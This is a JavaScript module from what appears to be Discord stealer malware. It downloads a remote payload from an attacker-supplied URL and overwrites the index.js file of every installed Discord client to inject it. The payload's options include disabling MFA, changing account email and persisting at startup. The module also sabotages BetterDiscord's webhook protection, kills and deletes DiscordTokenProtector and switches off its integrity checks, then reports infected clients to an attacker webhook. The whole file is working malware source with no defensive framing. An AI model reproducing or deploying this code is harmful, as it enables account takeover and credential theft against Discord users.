const child_process = require('child_process');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const glob = require('glob');

const requests = require('../../../utils/requests/requests.js');
const hardware = require('../../../utils/hardware/hardware.js');

const infectedDiscord = [];

const injectDiscord = async (dir, injectionUrl, webhookUrl, configInject) => {
  const appDirs = glob.globSync(path.join(dir, 'app-*').replace(/\\/g, '/'));
  const flattenedDirs = [];

  appDirs.forEach((coreDir) => {
    const matchedDirs = glob.globSync(path.join(coreDir, 'modules', 'discord_desktop_core-*', 'discord_desktop_core').replace(/\\/g, '/'));
    flattenedDirs.push(...matchedDirs);
  });

  const applyInjection = flattenedDirs.map(async (coreDir) => {
    try {
      const initiationDir = path.join(coreDir, 'aurathemes');
      fs.mkdirSync(initiationDir, { recursive: true });

      const response = await axios.get(injectionUrl);
      const injection = response.data.replace('%WEBHOOK_URL%', webhookUrl).replace('%API_URL%', configInject.api).replace('%AUTO_PERSIST_STARTUP%', configInject.auto_persist_startup).replace('%AUTO_MFA_DISABLER%', configInject.auto_mfa_disabler).replace('%AUTO_EMAIL_UPDATE%', configInject.auto_email_update).replace('%AUTO_USER_PROFILE_EDIT%', configInject.auto_user_profile_edit).replace('%GOFILE_DOWNLOAD_LINK%', configInject.gofile_download_link);

      const indexJsPath = path.join(coreDir, 'index.js');
      fs.writeFileSync(indexJsPath, injection, 'utf8');

      const match = coreDir.match(/Local\\(discord|discordcanary|discordptb|discorddevelopment)\\/i);
      if (match) {
        const appName = match[1].toLowerCase();
        if (!infectedDiscord.includes(appName)) {
          infectedDiscord.push(appName);
        }
      }
    } catch (error) {
      console.error(error);
    }
  });

  await Promise.all(applyInjection);
};

const bypassBetterDiscord = (user) => {
  const bdPath = path.join(user, 'AppData', 'Roaming', 'BetterDiscord', 'data', 'betterdiscord.asar');

  if (fs.existsSync(bdPath)) {
    const txt = fs.readFileSync(bdPath, 'utf8');
    const modifiedTxt = txt.replace(/api\/webhooks/g, 'HackedByK4itrun');

    fs.writeFileSync(bdPath, modifiedTxt, 'utf8');
  }
};

const bypassTokenProtector = (user) => {
  const dir = path.join(user, 'AppData', 'Roaming', 'DiscordTokenProtector');
  const configPath = path.join(dir, 'config.json');

  try {
    const processes = child_process.execSync('tasklist', { encoding: 'utf8' }).split('\n');
    processes.forEach((process) => {
      if (process.toLowerCase().includes('discordtokenprotector')) {
        const processName = process.split(/\s+/)[0];
        child_process.execSync(`taskkill /F /IM ${processName}`);
      }
    });

    ['DiscordTokenProtector.exe', 'ProtectionPayload.dll', 'secure.dat'].forEach((file) => {
      const filePath = path.join(dir, file);
      try {
        fs.unlinkSync(filePath);
      } catch (error) {}
    });

    if (fs.existsSync(configPath)) {
      const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
      Object.assign(config, {
        k4itrun_is_here: 'https://discord.gg/XS6btuuUR7',
        auto_start: false,
        auto_start_discord: false,
        integrity: false,
        integrity_allowbetterdiscord: false,
        integrity_checkexecutable: false,
        integrity_checkhash: false,
        integrity_checkmodule: false,
        integrity_checkscripts: false,
        integrity_checkresource: false,
        integrity_redownloadhashes: false,
        iterations_iv: 364,
        iterations_key: 457,
        version: 69420,
      });
      fs.writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
      fs.appendFileSync(configPath, `\n\n//k4itrun_is_here | https://discord.gg/XS6btuuUR7`, 'utf8');
    }
  } catch (error) {
    console.error(error);
  }
};

module.exports = async (injectionUrl, webhookUrl, configInject) => {
  try {
    const users = await hardware.GetUsers();
    for (const user of users) {
      bypassBetterDiscord(user);
      bypassTokenProtector(user);

      const directories = [path.join(user, 'AppData', 'Local', 'discord'), path.join(user, 'AppData', 'Local', 'discordcanary'), path.join(user, 'AppData', 'Local', 'discordptb'), path.join(user, 'AppData', 'Local', 'discorddevelopment')];

      for (const dir of directories) {
        await injectDiscord(dir, injectionUrl, webhookUrl, configInject);
      }

      if (infectedDiscord.length > 0) {
        try {
          await requests.Webhook(webhookUrl, {
            embeds: [
              {
                title: 'Discord(s) Injected',
                description: infectedDiscord.map((name) => `\`${name}\``).join(', '),
              },
            ],
          });
        } catch (error) {
          console.error(error);
        }
      }
    }
  } catch (error) {
    console.error(error);
  }
};
